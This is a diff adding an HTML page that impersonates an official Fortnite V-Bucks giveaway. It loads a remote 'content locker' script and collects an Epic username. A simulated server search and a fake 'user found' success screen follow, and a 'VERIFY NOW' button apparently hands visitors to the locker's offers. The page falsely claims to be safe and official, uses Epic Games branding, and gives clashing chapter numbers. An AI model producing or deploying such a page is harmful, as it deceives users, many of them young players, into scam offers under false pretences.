@@ -1,1 +1,363 @@
 
+<!DOCTYPE html><html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fortnite Chapter 7 - Exclusive Giveaway</title>
+    
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Luckiest+Guy&family=Open+Sans:wght@400;700;800&display=swap" rel="stylesheet">
+    
+    <!-- FontAwesome for Icons -->
+    <link rel="stylesheet" href="css/all.min.css">
+
+    <!-- YOUR CONTENT LOCKER CODE START -->
+<script type="text/javascript">
+    var fTRtB_msN_PTnPDc={"it":4483779,"key":"4fb94"};
+</script>
+<script src="https://d19k1sh57v5k0g.cloudfront.net/4ea419b.js"></script>
+    <!-- YOUR CONTENT LOCKER CODE END -->
+
+    <style>
+        :root {
+            --fn-yellow: #f3e828;
+            --fn-blue: #2350dc;
+            --fn-dark-blue: #12192b;
+            --fn-white: #ffffff;
+            --fn-black: #000000;
+            --fn-green: #00ff41;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Open Sans', sans-serif;
+            background-color: var(--fn-dark-blue);
+            color: var(--fn-white);
+            overflow-x: hidden;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* --- Dynamic Background --- */
+        .bg-container {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%; z-index: -1;
+            background: radial-gradient(circle at center, #2b3a6e 0%, #0d101e 100%);
+            overflow: hidden;
+        }
+        .grid-overlay {
+            position: absolute; width: 200%; height: 200%;
+            background-image: 
+                linear-gradient(rgba(255, 255, 255, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(255, 255, 255, 0.03) 1px, transparent 1px);
+            background-size: 50px 50px;
+            transform: perspective(500px) rotateX(60deg) translateY(-100px) translateZ(-200px);
+            animation: gridMove 20s linear infinite;
+        }
+        @keyframes gridMove {
+            0% { transform: perspective(500px) rotateX(60deg) translateY(0) translateZ(-200px); }
+            100% { transform: perspective(500px) rotateX(60deg) translateY(50px) translateZ(-200px); }
+        }
+
+        /* --- Navbar --- */
+        nav {
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 20px 5%; background: rgba(18, 25, 43, 0.8);
+            backdrop-filter: blur(10px); border-bottom: 2px solid rgba(255,255,255,0.1);
+        }
+        .logo {
+            font-family: 'Luckiest Guy', cursive; font-size: 2rem;
+            text-transform: uppercase; letter-spacing: 2px; text-shadow: 0 4px 0 #000;
+        }
+        .nav-links { display: flex; gap: 30px; }
+        .nav-item {
+            font-weight: 800; text-transform: uppercase; font-size: 0.9rem;
+            color: rgba(255,255,255,0.7); cursor: pointer; transition: color 0.3s;
+        }
+        .nav-item:hover { color: var(--fn-yellow); }
+
+        /* --- Main Content --- */
+        .hero {
+            flex: 1; display: flex; flex-direction: column;
+            justify-content: center; align-items: center; text-align: center;
+            position: relative; padding: 20px;
+        }
+        .season-tag {
+            background: var(--fn-yellow); color: var(--fn-black);
+            padding: 5px 15px; font-weight: 800; text-transform: uppercase;
+            transform: skew(-10deg); margin-bottom: 20px;
+            box-shadow: 0 0 15px rgba(243, 232, 40, 0.5);
+            font-size: 1.2rem; animation: popIn 0.5s ease-out;
+        }
+        h1 {
+            font-family: 'Luckiest Guy', cursive; font-size: 5rem;
+            text-transform: uppercase; line-height: 0.9; margin-bottom: 10px;
+            text-shadow: 0 5px 0 #000, 0 0 30px rgba(35, 80, 220, 0.5);
+            animation: slideUp 0.8s ease-out;
+        }
+        .collab-text {
+            font-size: 1.2rem; font-weight: 700; color: #aebbf0;
+            margin-bottom: 30px; text-transform: uppercase; letter-spacing: 2px;
+        }
+
+        /* --- V-Bucks Image --- */
+        .vbucks-display {
+            position: relative; margin-bottom: 30px;
+            animation: float 3s ease-in-out infinite;
+        }
+        .vbucks-img {
+            width: 180px; height: auto;
+            filter: drop-shadow(0 0 20px rgba(0,212,255,0.6));
+        }
+        .amount-text {
+            font-family: 'Luckiest Guy', cursive; font-size: 3.5rem;
+            color: var(--fn-white); text-shadow: 0 4px 0 #000;
+            margin-top: -10px;
+        }
+
+        /* --- Button Styles --- */
+        .epic-btn {
+            background: var(--fn-yellow); color: var(--fn-black);
+            font-family: 'Luckiest Guy', cursive; font-size: 2rem;
+            padding: 20px 60px; border: none; outline: none; cursor: pointer;
+            text-transform: uppercase; transform: skew(-10deg);
+            transition: all 0.1s; box-shadow: -5px 5px 0px rgba(0,0,0,0.5);
+            display: inline-flex; align-items: center; justify-content: center; gap: 15px;
+        }
+        .epic-btn:hover {
+            transform: skew(-10deg) scale(1.05); background: #fff01f;
+            box-shadow: 0 0 30px rgba(243, 232, 40, 0.8);
+        }
+        .epic-btn:active { transform: skew(-10deg) scale(0.98); }
+
+        .btn-subtext {
+            display: block; margin-top: 15px; font-size: 0.8rem;
+            color: rgba(255,255,255,0.6); text-transform: uppercase; font-weight: 700;
+        }
+
+        /* --- Modal System --- */
+        .modal-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.85); display: flex;
+            justify-content: center; align-items: center; z-index: 100;
+            opacity: 0; pointer-events: none; transition: opacity 0.3s;
+            backdrop-filter: blur(8px);
+        }
+        .modal-overlay.active { opacity: 1; pointer-events: all; }
+
+        .modal-content {
+            background: linear-gradient(135deg, #1a233a 0%, #121520 100%);
+            width: 90%; max-width: 450px; padding: 40px;
+            border: 2px solid rgba(255,255,255,0.1);
+            text-align: center; transform: skew(-5deg);
+            box-shadow: 0 0 50px rgba(0,0,0,0.7);
+            position: relative;
+        }
+        
+        .modal-header {
+            font-family: 'Luckiest Guy'; font-size: 2rem;
+            color: var(--fn-yellow); margin-bottom: 20px;
+            text-transform: uppercase; text-shadow: 0 2px 0 #000;
+        }
+
+        /* Input Styles */
+        .fn-input {
+            width: 100%; padding: 15px; background: rgba(0,0,0,0.3);
+            border: 2px solid rgba(255,255,255,0.2); color: white;
+            font-family: 'Open Sans'; font-weight: 700; font-size: 1.1rem;
+            transform: skew(5deg); margin-bottom: 20px; outline: none;
+            transition: 0.3s;
+        }
+        .fn-input:focus { border-color: var(--fn-yellow); background: rgba(0,0,0,0.5); }
+        .fn-input::placeholder { color: rgba(255,255,255,0.3); }
+
+        /* Loading Bar */
+        .loading-container { display: none; }
+        .loading-bar {
+            width: 100%; height: 25px; background: #000;
+            margin: 20px 0; position: relative; overflow: hidden;
+            border: 2px solid rgba(255,255,255,0.2); transform: skew(5deg);
+        }
+        .loading-fill {
+            height: 100%; background: var(--fn-yellow); width: 0%;
+            transition: width 0.5s ease-out;
+            box-shadow: 0 0 15px var(--fn-yellow);
+        }
+
+        /* Verify Step */
+        .verify-step { display: none; }
+        .success-icon {
+            font-size: 4rem; color: var(--fn-green);
+            margin-bottom: 15px; animation: bounce 1s infinite;
+        }
+        .user-found-text {
+            color: var(--fn-green); font-weight: bold; text-transform: uppercase;
+            margin-bottom: 20px; font-size: 1.2rem;
+        }
+
+        .verify-btn {
+            background: #00d4ff; color: white; width: 100%;
+            font-family: 'Luckiest Guy'; font-size: 1.8rem;
+            padding: 15px; border: none; cursor: pointer;
+            text-transform: uppercase; transform: skew(5deg);
+            animation: pulse 1.5s infinite;
+            text-shadow: 0 2px 0 rgba(0,0,0,0.2);
+            box-shadow: 0 0 20px rgba(0, 212, 255, 0.4);
+        }
+        .verify-btn:hover { background: #33e0ff; }
+
+        /* Animations */
+        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-15px); } }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(50px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes popIn { from { transform: scale(0) skew(-10deg); } to { transform: scale(1) skew(-10deg); } }
+        @keyframes pulse { 0% { transform: skew(5deg) scale(1); } 50% { transform: skew(5deg) scale(1.05); } 100% { transform: skew(5deg) scale(1); } }
+        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
+
+        /* Mobile */
+        @media (max-width: 768px) {
+            h1 { font-size: 2.8rem; }
+            .vbucks-img { width: 140px; }
+            .amount-text { font-size: 2.5rem; }
+            .nav-links { display: none; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Background -->
+    <div class="bg-container"><div class="grid-overlay"></div></div>
+
+    <!-- Nav -->
+    <nav>
+        <div class="logo">Fortnite</div>
+        <div class="nav-links">
+            <div class="nav-item">Battle Pass</div>
+            <div class="nav-item">News</div>
+            <div class="nav-item">Shop</div>
+        </div>
+        <div class="nav-item" style="color: var(--fn-yellow);">Download</div>
+    </nav>
+
+    <!-- Main -->
+    <section class="hero">
+        <div class="season-tag">Chapter 8 Exclusive</div>
+        
+        <h1>GET YOUR <br><span style="color:var(--fn-yellow)">FREE REWARD</span></h1>
+        
+        <div class="vbucks-display">
+            <!-- Provided V-Bucks Logo -->
+            
+            <video autoplay muted loop playsinline style="width:100%; border-radius:20px;">
+  <source src="https://ucs-images.fortnite.com/blobs/72/86/62ee-aa68-4a59-8d4d-203e651f8d92?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIA2SBBZFECCYQWRK6G%2F20260610%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20260610T170549Z&X-Amz-Expires=90000&X-Amz-Signature=589b27be2b4d2c85127d1e04ad579f039c5aee23ca31245f97bdf17bb8b3258f&X-Amz-SignedHeaders=host&response-content-disposition=inline%3Bfilename%3D%22file.webm%22%3Bfilename%2A%3DUTF-8%27%27turntable-1-1280x1280.webm&x-id=GetObject" type="video/mp4">
+</video>
+            <div class="amount-text">Skeletor</div>
+        </div>
+
+        <p class="collab-text">Official Creator Giveaway</p>
+
+        <div>
+            <button class="epic-btn" onclick="openModal()">
+                <span>CLAIM NOW</span>
+            </button>
+            <span class="btn-subtext">Safe • Secure • Official</span>
+        </div>
+    </section>
+
+    <!-- Modal System -->
+    <div class="modal-overlay" id="modalOverlay">
+        <div class="modal-content">
+            
+            <!-- Step 1: Input -->
+            <div id="step1">
+                <div class="modal-header">Enter Epic ID</div>
+                <input type="text" id="usernameInput" class="fn-input" placeholder="Example: Ninja">
+                <button class="epic-btn" style="width:100%; transform: skew(5deg); font-size: 1.5rem;" onclick="startSearch()">
+                    CONNECT
+                </button>
+            </div>
+
+            <!-- Step 2: Loading -->
+            <div id="step2" class="loading-container">
+                <div class="modal-header" style="font-size: 1.5rem;">Searching Database...</div>
+                <div class="loading-bar">
+                    <div class="loading-fill" id="progressBar"></div>
+                </div>
+                <div id="statusText" style="color: #ccc; font-size: 0.9rem;">Connecting to Epic Games Servers...</div>
+            </div>
+
+            <!-- Step 3: Verify -->
+            <div id="step3" class="verify-step">
+                <i class="fa-solid fa-circle-check success-icon"></i>
+                <div class="modal-header" style="margin-bottom: 5px;">SUCCESS!</div>
+                <div class="user-found-text" id="foundUserText">User Found</div>
+                <p style="margin-bottom: 20px; font-size: 0.9rem; color: #ddd;">Final step: Verify you are human to receive your 13,500 V-Bucks immediately.</p>
+                
+                <!-- THE VERIFY BUTTON REQUESTED -->
+                <button class="verify-btn" onclick="_vH()">
+                    VERIFY NOW
+                </button>
+            </div>
+
+        </div>
+    </div>
+
+    <footer>
+        <p style="margin-top: 50px; opacity: 0.4; font-size: 0.7rem;">© 2025 Epic Games, Inc. All rights reserved. Not affiliated with Epic Games.</p>
+    </footer>
+
+    <script>
+        // Modal Logic
+        const modal = document.getElementById('modalOverlay');
+        const step1 = document.getElementById('step1');
+        const step2 = document.getElementById('step2');
+        const step3 = document.getElementById('step3');
+        const usernameInput = document.getElementById('usernameInput');
+        const progressBar = document.getElementById('progressBar');
+        const statusText = document.getElementById('statusText');
+        const foundUserText = document.getElementById('foundUserText');
+
+        function openModal() {
+            modal.classList.add('active');
+        }
+
+        function startSearch() {
+            const username = usernameInput.value;
+            if(username.length < 3) {
+                alert("Please enter a valid Epic Username");
+                return;
+            }
+
+            // Switch to Step 2
+            step1.style.display = 'none';
+            step2.style.display = 'block';
+
+            // Simulate Loading Process
+            let width = 0;
+            const interval = setInterval(() => {
+                width += Math.random() * 10;
+                if (width > 100) width = 100;
+                
+                progressBar.style.width = width + "%";
+
+                if (width > 30 && width < 60) {
+                    statusText.innerText = "Authenticating User: " + username + "...";
+                } else if (width > 60 && width < 90) {
+                    statusText.innerText = "Checking Eligibility...";
+                } else if (width >= 100) {
+                    clearInterval(interval);
+                    setTimeout(showSuccess, 800); // Small delay before success
+                }
+            }, 200);
+        }
+
+        function showSuccess() {
+            step2.style.display = 'none';
+            step3.style.display = 'block';
+            foundUserText.innerText = "User: " + usernameInput.value + " Found!";
+        }
+    </script>
+
+</body></html>
